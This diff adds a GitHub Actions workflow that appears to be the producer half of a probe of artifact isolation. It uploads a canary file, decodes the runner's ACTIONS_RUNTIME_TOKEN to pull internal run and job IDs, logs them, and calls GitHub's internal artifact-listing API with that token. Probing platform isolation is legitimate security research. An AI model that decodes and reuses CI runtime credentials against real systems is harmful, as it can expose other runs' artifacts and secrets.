@@ -1,0 +1,47 @@
+name: probe_v79_producer
+on:
+  workflow_dispatch:
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: make-canary
+        run: echo "V79-CANARY-RUN-${GITHUB_RUN_ID}-secretmarker" > canary.txt
+      - name: upload-canary
+        uses: actions/upload-artifact@v4
+        with:
+          name: v79canary
+          path: canary.txt
+      - name: capture-backend-ids
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const M = (s) => core.info('MARK ' + s);
+            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
+            const ru = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
+            M('RT_PRESENT=' + (rt ? 'yes' : 'NO'));
+            M('RESULTS_URL=' + ru);
+            M('PRODUCER_RUN_ID=' + process.env.GITHUB_RUN_ID);
+            if (!rt) { M('PRODUCER_ABORT no ACTIONS_RUNTIME_TOKEN even in JS-action context'); return; }
+            let scp = '';
+            try {
+              const p = JSON.parse(Buffer.from(rt.split('.')[1].replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString());
+              scp = p.scp || '';
+            } catch (e) { M('SCP_DECODE_ERR=' + String(e).slice(0,80)); }
+            M('SCP=' + scp);
+            const m = scp.match(/Actions\.Results:([0-9a-fA-F-]+):([0-9a-fA-F-]+)/);
+            M('RUN_BID=' + (m ? m[1] : 'none'));
+            M('JOB_BID=' + (m ? m[2] : 'none'));
+            // sanity: list OWN artifacts to prove the Twirp shape works for the producer too
+            if (m) {
+              try {
+                const r = await fetch(ru + '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
+                  { method:'POST', headers:{'Authorization':'Bearer '+rt,'Content-Type':'application/json'},
+                    body: JSON.stringify({workflow_run_backend_id:m[1], workflow_job_run_backend_id:m[2]}) });
+                const t = await r.text();
+                M('PRODUCER_OWN_LIST -> ' + r.status + ' | ' + t.slice(0,200).replace(/\n/g,' '));
+              } catch (e) { M('PRODUCER_OWN_LIST_ERR=' + String(e).slice(0,100)); }
+            }
+            M('PRODUCER_DONE');
